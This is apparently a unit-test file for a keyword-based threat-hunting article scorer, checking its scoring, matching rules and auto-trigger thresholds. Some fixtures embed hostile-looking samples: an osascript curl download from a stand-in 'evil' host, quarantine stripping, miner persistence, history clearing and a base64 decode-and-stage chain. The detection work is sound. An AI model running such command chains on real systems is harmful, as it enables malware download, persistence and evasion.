"""Tests for threat hunting scorer functionality."""

import pytest

from src.utils.content import HUNT_SCORING_KEYWORDS, ThreatHuntingScorer

pytestmark = pytest.mark.unit


class TestThreatHuntingScorer:
    """Test ThreatHuntingScorer functionality."""

    def test_score_threat_hunting_content_empty_content(self):
        """Test scoring with empty content."""
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", "")

        assert result["threat_hunting_score"] == 0.0
        assert result["perfect_keyword_matches"] == []
        assert result["good_keyword_matches"] == []
        assert result["lolbas_matches"] == []
        assert result["intelligence_matches"] == []
        assert result["negative_matches"] == []

    def test_score_threat_hunting_content_none_content(self):
        """Test scoring with None content."""
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", None)

        assert result["threat_hunting_score"] == 0.0
        assert result["perfect_keyword_matches"] == []
        assert result["good_keyword_matches"] == []
        assert result["lolbas_matches"] == []
        assert result["intelligence_matches"] == []
        assert result["negative_matches"] == []

    def test_score_threat_hunting_content_perfect_discriminators(self):
        """Test scoring with perfect discriminator keywords."""
        content = "This article discusses rundll32.exe and comspec environment variables."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        assert result["threat_hunting_score"] > 0
        assert "rundll32.exe" in result["perfect_keyword_matches"]
        assert "comspec" in result["perfect_keyword_matches"]
        # .exe might be in good_keyword_matches due to the content
        assert len(result["good_keyword_matches"]) >= 0
        # rundll32 might be in lolbas_matches as well
        assert len(result["lolbas_matches"]) >= 0
        assert result["intelligence_matches"] == []

    def test_score_threat_hunting_content_good_discriminators(self):
        """Test scoring with good discriminator keywords."""
        content = "This article discusses temp files and event ID monitoring."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        assert result["threat_hunting_score"] > 0
        assert "temp" in result["good_keyword_matches"]
        assert "Event ID" in result["good_keyword_matches"]
        assert result["perfect_keyword_matches"] == []
        assert result["lolbas_matches"] == []
        assert result["intelligence_matches"] == []

    def test_score_threat_hunting_content_lolbas_executables(self):
        """Test scoring with LOLBAS executables."""
        content = "This article discusses certutil.exe and cmd.exe techniques."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        assert result["threat_hunting_score"] > 0
        assert "certutil.exe" in result["lolbas_matches"]
        assert "cmd.exe" in result["lolbas_matches"]
        # Cmd might be in perfect_keyword_matches as well
        assert len(result["perfect_keyword_matches"]) >= 0
        # .exe might be in good_keyword_matches
        assert len(result["good_keyword_matches"]) >= 0
        assert result["intelligence_matches"] == []

    def test_score_threat_hunting_content_intelligence_indicators(self):
        """Test scoring with intelligence indicators."""
        content = "This article discusses APT campaigns and threat actors."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        assert result["threat_hunting_score"] > 0
        assert "APT" in result["intelligence_matches"]
        # threat actor might not match exactly
        assert len(result["intelligence_matches"]) > 0
        assert result["perfect_keyword_matches"] == []
        assert result["good_keyword_matches"] == []
        assert result["lolbas_matches"] == []

    def test_score_threat_hunting_content_negative_indicators(self):
        """Test scoring with negative indicators."""
        content = "This is a tutorial on how to learn more about best practices."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        assert result["threat_hunting_score"] == 0.0
        assert "how to" in result["negative_matches"]
        assert "tutorial" in result["negative_matches"]
        assert "best practices" in result["negative_matches"]

    def test_score_threat_hunting_content_mixed_keywords(self):
        """Test scoring with mixed keyword types."""
        content = """
        This article discusses APT campaigns using rundll32.exe and certutil.exe.
        It covers threat hunting techniques and event ID monitoring.
        This is not a tutorial or best practices guide.
        """
        result = ThreatHuntingScorer.score_threat_hunting_content("Threat Hunting Guide", content)

        assert result["threat_hunting_score"] > 0
        assert len(result["perfect_keyword_matches"]) > 0
        assert len(result["lolbas_matches"]) > 0
        assert len(result["intelligence_matches"]) > 0
        assert len(result["good_keyword_matches"]) > 0

    def test_score_threat_hunting_content_title_included(self):
        """Test that title is included in scoring."""
        title = "PowerShell Attack Using rundll32.exe"
        content = "This article discusses various techniques."
        result = ThreatHuntingScorer.score_threat_hunting_content(title, content)

        assert result["threat_hunting_score"] > 0
        assert "rundll32.exe" in result["perfect_keyword_matches"]

    def test_score_threat_hunting_content_html_content(self):
        """Test scoring with HTML content."""
        content = "<p>This article discusses <strong>rundll32.exe</strong> and <em>comspec</em> variables.</p>"
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        assert result["threat_hunting_score"] > 0
        assert "rundll32.exe" in result["perfect_keyword_matches"]
        assert "comspec" in result["perfect_keyword_matches"]

    def test_score_threat_hunting_content_case_insensitive(self):
        """Test that scoring is case insensitive."""
        content = "This article discusses RUNDLL32.EXE and COMspec environment variables."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        assert result["threat_hunting_score"] > 0
        assert "rundll32.exe" in result["perfect_keyword_matches"]
        assert "comspec" in result["perfect_keyword_matches"]

    def test_score_threat_hunting_content_logarithmic_scoring(self):
        """Test that scoring uses logarithmic scaling."""
        # Single perfect discriminator
        content1 = "This article discusses rundll32.exe."
        result1 = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content1)

        # Multiple perfect discriminators
        content2 = "This article discusses rundll32.exe, comspec, msiexec.exe, and wmic.exe."
        result2 = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content2)

        # Score should increase but with diminishing returns
        assert result2["threat_hunting_score"] > result1["threat_hunting_score"]

        # The increase should be less than linear (logarithmic scaling)
        score_increase = result2["threat_hunting_score"] - result1["threat_hunting_score"]
        expected_linear_increase = result1["threat_hunting_score"] * 3  # 3 additional keywords
        assert score_increase < expected_linear_increase

    def test_score_threat_hunting_content_maximum_scores(self):
        """Test that scores are capped at maximum values."""
        # Create content with many keywords from each category
        perfect_keywords = HUNT_SCORING_KEYWORDS["perfect_discriminators"][:10]
        good_keywords = HUNT_SCORING_KEYWORDS["good_discriminators"][:10]
        lolbas_keywords = HUNT_SCORING_KEYWORDS["lolbas_executables"][:10]
        intelligence_keywords = HUNT_SCORING_KEYWORDS["intelligence_indicators"][:10]

        content = f"""
        This article discusses {", ".join(perfect_keywords)}.
        It also covers {", ".join(good_keywords)}.
        The article mentions {", ".join(lolbas_keywords)}.
        Finally, it discusses {", ".join(intelligence_keywords)}.
        """

        result = ThreatHuntingScorer.score_threat_hunting_content("Comprehensive Test", content)

        # Score should be capped at 100
        assert result["threat_hunting_score"] <= 100.0
        assert result["threat_hunting_score"] > 0

    def test_score_threat_hunting_content_negative_penalty_cap(self):
        """Test that negative penalties are capped."""
        content = "This is a tutorial on how to learn more about best practices and what is security."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        # Score should not go below 0
        assert result["threat_hunting_score"] >= 0.0

    def test_keyword_matches_word_boundaries(self):
        """Test keyword matching with word boundaries."""
        # Should match
        assert ThreatHuntingScorer._keyword_matches("rundll32", "rundll32.exe")
        assert ThreatHuntingScorer._keyword_matches("rundll32", "The rundll32 process")

        # Should not match (partial words)
        assert not ThreatHuntingScorer._keyword_matches("rundll32", "myrundll32process")
        assert not ThreatHuntingScorer._keyword_matches("rundll32", "rundll32test")

    def test_keyword_matches_partial_keywords(self):
        """Test keyword matching for partial match keywords."""
        # Should match partial keywords
        assert ThreatHuntingScorer._keyword_matches("hunting", "threat hunting")
        assert ThreatHuntingScorer._keyword_matches("detection", "threat detection")
        assert ThreatHuntingScorer._keyword_matches("monitor", "monitoring")
        assert ThreatHuntingScorer._keyword_matches("alert", "alerting")

    def test_keyword_matches_wildcard_keywords(self):
        """Test keyword matching for wildcard keywords."""
        # Should match wildcard keywords
        assert ThreatHuntingScorer._keyword_matches("spawn", "spawns")
        assert ThreatHuntingScorer._keyword_matches("spawn", "spawning")
        assert ThreatHuntingScorer._keyword_matches("spawn", "spawned")

    def test_keyword_matches_symbol_keywords(self):
        """Test keyword matching for symbol keywords."""
        # Should match symbols without word boundaries
        assert ThreatHuntingScorer._keyword_matches("==", "if (x == y)")
        assert ThreatHuntingScorer._keyword_matches("!=", "if (x != y)")
        assert ThreatHuntingScorer._keyword_matches("::", "namespace::class")
        assert ThreatHuntingScorer._keyword_matches(
            "-->", "x --> y"
        )  # codeql[py/bad-tag-filter] false positive: test string literal, not an HTML sanitizer
        assert ThreatHuntingScorer._keyword_matches("->", "x -> y")

    def test_keyword_matches_regex_patterns(self):
        """Test keyword matching for regex patterns."""
        # Test environment variable substring access
        assert ThreatHuntingScorer._keyword_matches(r"%[A-Za-z0-9_]+:~[0-9]+(,[0-9]+)?%", "echo %PATH:~0,5%")

        # Test delayed expansion markers
        assert ThreatHuntingScorer._keyword_matches(r"![A-Za-z0-9_]+!", "echo !VAR!")

        # Test cmd.exe with /V flag
        assert ThreatHuntingScorer._keyword_matches(r"\bcmd(\.exe)?\s*/V(?::[^ \t/]+)?", "cmd /V:ON")

    def test_keyword_matches_case_insensitive(self):
        """Test that keyword matching is case insensitive."""
        assert ThreatHuntingScorer._keyword_matches("rundll32", "RUNDLL32.EXE")
        assert ThreatHuntingScorer._keyword_matches("RUNDLL32", "rundll32.exe")
        assert ThreatHuntingScorer._keyword_matches("Rundll32", "RUNDLL32.EXE")

    def test_keyword_matches_regex_escape(self):
        """Test that special regex characters are escaped."""
        # Should match literal dots, not regex wildcards
        assert ThreatHuntingScorer._keyword_matches(".exe", "test.exe")
        assert not ThreatHuntingScorer._keyword_matches(".exe", "testAexe")

    def test_score_threat_hunting_content_realistic_example(self):
        """Test scoring with a realistic threat intelligence article."""
        title = "APT29 Campaign Uses PowerShell and LOLBAS for Persistence"
        content = """
        This article describes an APT29 campaign that uses PowerShell techniques
        including rundll32.exe and certutil.exe for persistence. The threat actors
        use comspec environment variables and wmic commands to evade detection.

        The campaign targets Event ID 4624 and uses parent-child process relationships
        to maintain persistence. Hunters should look for svchost.exe spawning
        unusual child processes.

        This is not a tutorial but a real-world threat intelligence report
        describing an active campaign in the wild.
        """

        result = ThreatHuntingScorer.score_threat_hunting_content(title, content)

        # Should have high score due to multiple perfect discriminators
        assert result["threat_hunting_score"] > 50
        # Note: "wmic" without .exe may not match "wmic.exe" in perfect_discriminators
        assert len(result["perfect_keyword_matches"]) >= 4
        assert len(result["lolbas_matches"]) > 0
        assert len(result["intelligence_matches"]) > 0
        assert len(result["good_keyword_matches"]) > 0
        # tutorial might be detected as negative
        assert len(result["negative_matches"]) >= 0

    def test_score_threat_hunting_content_educational_content(self):
        """Test scoring with educational content that should be penalized."""
        title = "What is Threat Hunting? A Guide to Best Practices"
        content = """
        This tutorial explains what is threat hunting and how to get started.
        Learn more about best practices and download our free guide.
        This is an introduction to the fundamentals of threat hunting.
        Click here to read more about our training program.
        """

        result = ThreatHuntingScorer.score_threat_hunting_content(title, content)

        # Should have low score due to negative indicators
        assert result["threat_hunting_score"] < 20
        assert len(result["negative_matches"]) > 0
        assert len(result["perfect_keyword_matches"]) == 0

    def test_score_threat_hunting_content_mixed_quality(self):
        """Test scoring with mixed quality content."""
        title = "Threat Hunting Techniques: A Practical Guide"
        content = """
        This article discusses practical threat hunting techniques using
        rundll32.exe and PowerShell. However, it's also a tutorial on
        how to learn more about best practices in threat hunting.

        The content covers real-world examples but includes educational
        elements that should be penalized.
        """

        result = ThreatHuntingScorer.score_threat_hunting_content(title, content)

        # Should have moderate score - positive keywords but negative indicators
        assert 20 < result["threat_hunting_score"] < 60
        assert len(result["perfect_keyword_matches"]) > 0
        assert len(result["negative_matches"]) > 0

    def test_score_threat_hunting_content_edge_cases(self):
        """Test scoring with edge cases."""
        # Very long content
        long_content = "rundll32.exe " * 1000
        result = ThreatHuntingScorer.score_threat_hunting_content("Test", long_content)
        assert result["threat_hunting_score"] > 0

        # Content with special characters
        special_content = "This discusses rundll32.exe, comspec, and %PATH% variables."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test", special_content)
        assert result["threat_hunting_score"] > 0

        # Content with unicode characters
        unicode_content = "This discusses rundll32.exe and comspec variables. 测试内容"
        result = ThreatHuntingScorer.score_threat_hunting_content("Test", unicode_content)
        assert result["threat_hunting_score"] > 0

    def test_score_threat_hunting_content_return_format(self):
        """Test that the return format is correct."""
        content = "This discusses rundll32.exe and comspec variables."
        result = ThreatHuntingScorer.score_threat_hunting_content("Test Title", content)

        # Check return format
        assert isinstance(result, dict)
        assert "threat_hunting_score" in result
        assert "perfect_keyword_matches" in result
        assert "good_keyword_matches" in result
        assert "lolbas_matches" in result
        assert "intelligence_matches" in result
        assert "negative_matches" in result

        # Check types
        assert isinstance(result["threat_hunting_score"], float)
        assert isinstance(result["perfect_keyword_matches"], list)
        assert isinstance(result["good_keyword_matches"], list)
        assert isinstance(result["lolbas_matches"], list)
        assert isinstance(result["intelligence_matches"], list)
        assert isinstance(result["negative_matches"], list)

        # Check score range
        assert 0.0 <= result["threat_hunting_score"] <= 100.0


class TestNonWindowsHuntScoring:
    """Platform-complete huntability: high-fidelity macOS/Linux carriers must let a genuinely
    huntable non-Windows article clear the auto-trigger gate (85), while benign sysadmin prose
    and single passing mentions must NOT. Calibration: spec
    docs/superpowers/specs/2026-06-20-unified-keyword-platform-scoring-design.md §9.1.
    """

    AUTO_TRIGGER = 85.0

    def test_macos_persistence_article_clears_autotrigger(self):
        """A realistic macOS CTI write-up (huntable artifacts + threat-intel context) must reach
        >= 85 so it is no longer dropped before processing. NOTE: the perfect bucket asymptotes at
        75, so clearing 85 requires the supporting buckets too (good/intel) — which real CTI
        articles carry. Pure-technical articles light on intel vocabulary remain a residual the
        configurable threshold covers (spec §9.1)."""
        content = (
            "In this campaign the Lazarus threat actor delivered a macOS payload. The dropper "
            "executes osascript -e 'do shell script \"curl -fsSL https://evil/x -o /tmp/x\"', then "
            "establishes persistence by writing ~/Library/LaunchAgents/com.evil.helper.plist and "
            "loading it with launchctl load. To evade Gatekeeper it strips the flag with "
            "xattr -d com.apple.quarantine, queries TCC.db for privacy permissions, and runs dscl "
            "to enumerate local accounts before the downloader payload beacons to its C2."
        )
        result = ThreatHuntingScorer.score_threat_hunting_content("macOS stealer analysis", content)
        assert result["threat_hunting_score"] >= self.AUTO_TRIGGER, result["threat_hunting_score"]

    def test_macos_carriers_are_perfect_discriminators(self):
        """The macOS carriers must land in the perfect bucket (only perfect-tier moves an 85 gate)."""
        content = (
            "osascript do shell script launchctl LaunchAgents LaunchDaemons "
            "com.apple.quarantine xattr TCC.db dscl plutil"
        )
        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
        for token in ("osascript", "do shell script", "launchctl", "com.apple.quarantine", "tcc.db"):
            assert token in perfect, (token, result["perfect_keyword_matches"])

    def test_benign_linux_sysadmin_not_autotriggered(self):
        """Generic Linux admin tokens (systemctl / chmod +x / crontab) are good/lolbas at most —
        a how-to with marketing prose must stay below the gate (FP guard)."""
        content = (
            "To deploy, run chmod +x deploy.sh and systemctl enable myapp. See our best "
            "practices guide and free trial for how to set up a crontab entry."
        )
        result = ThreatHuntingScorer.score_threat_hunting_content("How to set up a service", content)
        assert result["threat_hunting_score"] < self.AUTO_TRIGGER, result["threat_hunting_score"]

    def test_single_macos_mention_does_not_autotrigger(self):
        """One passing carrier mention (n_perfect=1 -> ~37.5) must not cross the gate — the
        geometry, not FP-prone vocabulary, is what protects against single-mention over-trigger."""
        content = "The report briefly mentions osascript as one technique among many. " + "context. " * 30
        result = ThreatHuntingScorer.score_threat_hunting_content("survey", content)
        assert result["threat_hunting_score"] < self.AUTO_TRIGGER, result["threat_hunting_score"]

    def test_linux_generic_tokens_not_perfect(self):
        """Generic Linux admin tokens (systemctl / crontab / chmod +x / insmod) must NOT be
        perfect — they carry benign-sysadmin / driver-dev false positives."""
        content = "systemctl crontab chmod +x insmod"
        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
        for token in ("systemctl", "crontab", "chmod +x", "insmod"):
            assert token not in perfect, (token, result["perfect_keyword_matches"])

    def test_linux_cryptojacking_clears_autotrigger(self):
        """A realistic Linux cryptojacking write-up (xmrig + fileless + anti-removal + persistence
        + intel context) must reach >= 85. xmrig alone covers ~36 corpus articles."""
        content = (
            "This cryptojacking campaign by a known threat actor targets Linux servers in the "
            "wild. The dropper writes its XMRig miner payload to /tmp/, uses memfd_create for "
            "fileless execution, applies chattr +i to lock the binary against removal, persists "
            "via a cron.d entry and /etc/rc.local, and runs history -c to clear shell history."
        )
        result = ThreatHuntingScorer.score_threat_hunting_content("Linux cryptojacking analysis", content)
        assert result["threat_hunting_score"] >= self.AUTO_TRIGGER, result["threat_hunting_score"]

    def test_linux_carriers_are_perfect_discriminators(self):
        """The validated low-FP Linux carriers must land in the perfect bucket."""
        content = "xmrig memfd_create chattr +i ld.so.preload cron.d /etc/rc.local history -c /proc/self/exe"
        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
        for token in ("xmrig", "memfd_create", "chattr +i"):
            assert token in perfect, (token, result["perfect_keyword_matches"])

    def test_decode_and_stage_carriers_promoted_to_perfect(self):
        """base64 -d (decode-and-execute) and chmod 777 (world-writable payload staging) were
        promoted from good after context review — in the CTI corpus they appear only in malware
        command chains. Note: chmod +x (benign tutorial token) stays good."""
        content = "base64 -d /tmp/x.b64 > /tmp/x && chmod 777 /tmp/x"
        result = ThreatHuntingScorer.score_threat_hunting_content("t", content)
        perfect = {m.lower() for m in result["perfect_keyword_matches"]}
        assert "base64 -d" in perfect, result["perfect_keyword_matches"]
        assert "chmod 777" in perfect, result["perfect_keyword_matches"]
